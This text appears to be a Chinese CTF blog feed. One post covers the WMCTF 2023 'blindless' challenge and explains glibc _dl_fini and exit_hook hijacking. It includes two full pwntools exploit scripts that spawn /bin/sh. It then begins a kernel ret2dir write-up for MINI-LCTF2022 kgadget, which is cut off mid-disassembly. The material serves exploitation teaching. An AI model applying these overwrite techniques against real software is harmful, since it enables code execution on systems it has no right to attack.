        <content type="html"><![CDATA[<h2 id="blindless"><a href="#blindless" class="headerlink" title="blindless"></a>blindless</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/w/blindless&gt; checksec main</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/wmctf/blindless/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>给了后门函数，executeBrainfuck函数可以根据输入的code，实现以malloc的data为基准的任意高地址写数据，data大小没有限制，可以mmap到libc固定偏移处</p><h2 id="dl-fini"><a href="#dl-fini" class="headerlink" title="_dl_fini"></a>_dl_fini</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//参数: main函数指针</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//参数: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//参数: init ELF的构造函数</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//参数: fini ELF的析构函数</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//参数: rtld_fini ld的析构函数</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//参数: 栈顶</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230831174521411.png" alt="image-20230831174521411"></p><p>多个构造函数时存放在.init_array中，init(一般就是__libc_csu_init)就负责遍历.init_array来执行多个构造函数</p><p>多个析构函数放在.fini_array中但是fini(一般是__libc_csu_fini)是个空函数</p><p><img src="/2023/08/28/2023wmctf/image-20230831174746076.png" alt="image-20230831174746076"></p><p>析构就由ld的析构函数 rtdl_fini负责，rdl_fini实际指向_dl_fini()函数，被编译到ld.so.2中</p><p>ld.so.2会通过dl_open()把所需文件映射到进程空间中, 他会把所有映射的文件都记录在结构体**_rtld_global**中，进程终止, ld.so.2需要卸载所映射的模块, 这需要调用每一个非共享模块的fini_arrary段中的析构函数</p><blockquote><p>Linux Namespaces机制：namespace就是一个进程的集合, 这个进程集合中可以看到相同的全局资源</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span>//描述命名空间</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">        <span class="comment">/* _ns_loaded中有多少模块 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br></pre></td></tr></table></figure><p>link_map *_ns_loaded 用来描述进程映射的一个模块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;<span class="comment">/* 模块在内存中的的基地址 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* 模块的文件名  */</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_ld;<span class="comment">/* 指向ELF中的Dynamic节 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span><span class="comment">/* 双向链表指针 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span><span class="comment">/* 双向链表指针 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"> </span><br><span class="line">    Lmid_t l_ns; <span class="comment">/* 这个模块所属NameSapce的idx  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];  <span class="comment">//l_info 里面包含的就是动态链接的各个节的信息</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELF的头表  */</span></span><br><span class="line">    ElfW(Addr) l_entry;        <span class="comment">/* ELF入口点  */</span></span><br><span class="line">    ElfW(Half) l_phnum;        <span class="comment">/* 头表中有多少节  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节中有多少描述符  *</span></span><br><span class="line"><span class="comment">    .......</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword    d_tag;<span class="comment">/* Dynamic entry type *64位程序占8bit 用于区分各种指定信息类型的标记，该结构中的共用体根据该标志进行解释/</span></span><br><span class="line"><span class="comment">  union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;                     <span class="number">64</span>位程序占<span class="number">8b</span>it 或者保存一个虚拟地址，或者保存一个整数，可以根据特定的标志进行解释。</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAY25<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230831195723378.png" alt="image-20230831195723378"></p><p>_dl_fini遍历rtld_global中所有的命名空间，遍历命名空间中所有的模块，找到这个模块的fini_array段, 并调用其中的所有函数指针</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span><span class="comment">//有析构函数</span></span><br><span class="line">      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">              ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)<span class="comment">//fini_array多个析构函数</span></span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">        (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">      <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)<span class="comment">//fini析构函数</span></span><br><span class="line">    DL_CALL_DT_FINI</span><br><span class="line">      (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>.fini_array地址<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>,同时控制l-&gt;l_info[DT_FINI_ARRAYSZ]大于0即可，执行.fini_arry里函数指针所指向的函数</p><p>或者直接控制l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr，直接执行地址处函数</p><p>l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr原本是指向</p><p><img src="/2023/08/28/2023wmctf/image-20230901011053856.png" alt="image-20230901011053856"></p><p>我们只需要修改l-&gt;l_addr使l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr+l-&gt;l_addr指向backdoor，同时l-&gt;l_info[DT_FINI_ARRAY]修改为0，即可</p><blockquote><p>另一种方法：调用析构函数时由于rdi是固定的地址(libc2.31为 _rtld_global+2312)，所以可以控制rdi为&#x2F;bin&#x2F;sh，fini为system地址或者把.fini_arry指向system got表</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">b&#x27;.&#x27;</span> + p8(content[i]) + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># dbpie(&#x27;0x130E&#x27;)</span></span><br><span class="line">    <span class="comment"># dbpie(&#x27;0x001301&#x27;)</span></span><br><span class="line">    sla(<span class="string">b&#x27;ta size&#x27;</span>,<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">    code=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fe5e466f190</span>- <span class="number">0x7fe5e4357010</span>)+write(p32(<span class="number">0x3CB1</span>)[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line">    code+=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7f30010c62a0</span>-<span class="number">0x7f30010c6190</span>-<span class="number">2</span>)+write(p64(<span class="number">0</span>))+<span class="string">b&#x27;q&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;code&#x27;</span>,code)</span><br><span class="line">    data=io.recvrepeat(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">      <span class="built_in">print</span>(data)</span><br><span class="line">      pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      io.close()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230901010937493.png" alt="image-20230901010937493"></p><h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a><a href="https://www.cnblogs.com/pwnfeifei/p/15759130.html">exit_hook</a></h2><p>劫持rtld_global中的函数指针(一般时上锁解锁的函数)，调用关系 exit()–&gt;__run_exit_handlers–&gt;_dl_fini–&gt;rtld_lock_default_lock_recursive–&gt;rtld_lock_default_unlock_recursive</p><p>其中<code>rtld_lock_default_lock_recursive</code>和<code>rtld_lock_default_unlock_recursive</code>来自于<code>_rtld_global</code>结构体</p><p><img src="/2023/08/28/2023wmctf/image-20230830134733689.png" alt="image-20230830134733689"></p><p>其中rtld_lock_default_lock_recursive和<code>rtld_lock_default_unlock_recursive</code>调用时参数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock))</span><br></pre></td></tr></table></figure><p><code>GL(dl_load_lock)</code>也是从<code>_rtld_global</code>里取出来的值，即<code>_rtld_global._dl_load_lock.mutex</code>的地址</p><blockquote><p>libc和ld偏移通常第2字节处不一样，256种可能</p></blockquote><p>一种方法就是改<code>rtld_lock_default_lock_recursive</code>和<code>rtld_lock_default_unlock_recursive</code>其中一个为ogg</p><p>或者改<code>rtld_lock_default_lock_recursive</code>和<code>rtld_lock_default_unlock_recursive</code>其中一个为system，改<code>_rtld_global._dl_load_lock.mutex</code>处为“&#x2F;bin&#x2F;sh\x00”</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">b&#x27;.&#x27;</span> + p8(content[i]) + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1301  &#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x01313&#x27;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(pwnfile)</span><br><span class="line">        sla(<span class="string">b&#x27;ta size&#x27;</span>,<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">        code=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fc4cf08c968</span>-<span class="number">0x7fc4ced75010</span>)+write(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        code+=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fc4cf08cf60</span>-<span class="number">0x7fc4cf08c968</span>)+write(p32(<span class="number">0xb6e290</span>)[<span class="number">0</span>:<span class="number">3</span>])+<span class="string">b&#x27;q&#x27;</span></span><br><span class="line">        sla(<span class="string">b&#x27;code&#x27;</span>,code)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        sl(<span class="string">b&#x27;cat /flag&#x27;</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><strong>关于exit的利用：<a href="https://www.anquanke.com/post/id/243196">https://www.anquanke.com/post/id/243196</a></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Ret2dir</title>
      <link href="/2023/08/22/kernel-ret2dir/"/>
      <url>/2023/08/22/kernel-ret2dir/</url>
      
        <content type="html"><![CDATA[<h1 id="return-to-direct-mapped-memory"><a href="#return-to-direct-mapped-memory" class="headerlink" title="return to direct-mapped memory"></a>return to direct-mapped memory</h1><p>绕过smep smap保护等用户空间与内核空间隔离的防护手段</p><p>查看linux x86虚拟内存布局 <a href="https://elixir.bootlin.com/linux/v5.19.17/source/Documentation/x86/x86_64/mm.rst">https://elixir.bootlin.com/linux/v5.19.17/source/Documentation/x86/x86_64/mm.rst</a></p><p>里面存在一块direct mapping of all physical memory的虚拟内存<strong>线性地直接映射了整个或部分物理内存空间</strong>，这块区域也叫<strong>physmap</strong></p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820153202390.png" alt="image-20230820153202390"></p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820102303460.png" alt="image-20230820102303460"></p><p>Linux在x86-64架构是直接映射了整个物理内存到这块区域(上面图片是48位虚拟内存4级页表的情况)，所有就可以利用这块区域访问到在用户空间布置的一些payload，新版本这块直接映射区没有执行权限，只能rop</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820154114405.png" alt="image-20230820154114405"></p><h2 id="MINI-LCTF2022-kgadget"><a href="#MINI-LCTF2022-kgadget" class="headerlink" title="MINI-LCTF2022 - kgadget"></a><a href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">MINI-LCTF2022 - kgadget</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/kgadget&gt; file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 5.10.112 (arttnba3@ubuntu) #1 SMP Thu Apr 21 19:47:35 +08 2022, RO-rootFS, swap_dev 0X9, Normal VGA</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/k/rootfs&gt; cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/kgadget&gt; checksec kgadget.ko</span><br><span class="line">[*] &#x27;/home/grxer/kernel-env/kgadget/kgadget.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>init脚本里限制了demsg和&#x2F;proc&#x2F;kallsystem</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure><p>run.sh开了smep smap kpti，没开kaslr，可以通过vmlinux获取函数地址和gadget位置</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \</span><br></pre></td></tr></table></figure><p>没有给vmlinux需要从bzImage里恢复,两种方法</p><ul><li>extract-vmlinux ps：这道题用这个没恢复出来符号表</li><li>vmlinux-to-elf</li></ul><p>file_operations结构体里重写了下面的函数</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820170432061.png" alt="image-20230820170432061"></p><p>ioctl函数伪代码不太好看，直接看汇编</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text.unlikely:<span class="number">00000000000000F</span>3                               ; __int64 __fastcall <span class="title function_">kgadget_ioctl</span><span class="params">(file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 param)</span></span><br><span class="line">.text.unlikely:00000000000000F3                               kgadget_ioctl proc near                 ; DATA XREF: __mcount_loc:<span class="number">0000000000000653</span>↓o</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                                                                       ; .data:kgadget_fo↓o</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               regs_addr= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               __file = rdi                            ; file *</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               cmd = rsi                               ; <span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               param = rdx                             ; <span class="type">unsigned</span> __int64</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3 E8 <span class="number">40</span> <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    __fentry__                      ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>8 <span class="number">55</span>                            push    rbp</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>9 <span class="number">48</span> <span class="number">89</span> E5                      mov     rbp, rsp</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>C <span class="number">53</span>                            push    rbx</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>D <span class="number">48</span> <span class="number">83</span> EC <span class="number">10</span>                   sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000101</span> <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov     rax, gs:<span class="number">28</span>h</span><br><span class="line">.text.unlikely:<span class="number">000000000000010</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">45</span> F0                   mov     [rbp<span class="number">-10</span>h], rax</span><br><span class="line">.text.unlikely:<span class="number">000000000000010</span>E <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text.unlikely:<span class="number">0000000000000110</span> <span class="number">81</span> FE <span class="number">52</span> BF <span class="number">01</span> <span class="number">00</span>             cmp     esi, <span class="number">1B</span>F52h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000116</span> <span class="number">0F</span> <span class="number">85</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_1A3</span><br><span class="line">.text.unlikely:<span class="number">0000000000000116</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000011</span>C <span class="number">48</span> <span class="number">8B</span> <span class="number">1</span>A                      mov     rbx, [param]</span><br><span class="line">.text.unlikely:<span class="number">000000000000011F</span>                               kgadget_ptr = rbx                       ; <span class="type">void</span> (*)(<span 